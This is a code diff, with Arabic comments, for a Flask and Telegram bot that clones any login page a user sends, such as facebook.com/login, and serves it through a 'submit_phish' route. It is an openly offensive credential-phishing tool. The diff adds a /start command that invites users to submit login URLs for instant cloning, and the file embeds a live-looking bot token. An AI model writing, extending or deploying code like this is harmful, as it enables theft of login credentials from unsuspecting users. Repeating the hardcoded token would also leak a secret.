@@ -4,7 +4,7 @@ from bs4 import BeautifulSoup
 from flask import Flask, request, abort, redirect
 from threading import Thread
 from telegram import Update
-from telegram.ext import ApplicationBuilder, MessageHandler, filters, ContextTypes
+from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
 
 # ========== القيم المدمجة ==========
 BOT_TOKEN = "8511885419:AAHi0yNNaA1IVDtulFZBokSb9l_KbXaQe38"
@@ -40,12 +40,15 @@ def submit_phish(page_id):
 def health():
     return "GoldenGeneral Phish only"
 
-# --- تيليجرام معالج واحد: يستقبل أي رابط ويستنسخه ---
+# --- معالج أمر /start ---
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("🥇 أرسل رابط أي صفحة تسجيل دخول لاستنساخها فورًا.\nمثال: https://facebook.com/login")
+
+# --- معالج الروابط: يستقبل أي رابط ويفعله ---
 async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     url = update.message.text.strip()
     if not url.startswith("http"):
         url = "https://" + url
-    # إرسال رسالة انتظار
     msg = await update.message.reply_text("🔧 جاري استنساخ الموقع...")
     try:
         resp = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
@@ -64,7 +67,8 @@ def start_bot():
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     app_bot = ApplicationBuilder().token(BOT_TOKEN).build()
-    # نصفي الرسائل التي تحتوي رابط (بسيط: أي نص فيه http أو يبدأ بـ www)
+    app_bot.add_handler(CommandHandler("start", start))
+    # أي نص آخر (غير أوامر) يعامل كرابط
     app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link))
     app_bot.run_polling(close_loop=False)
     loop.close()
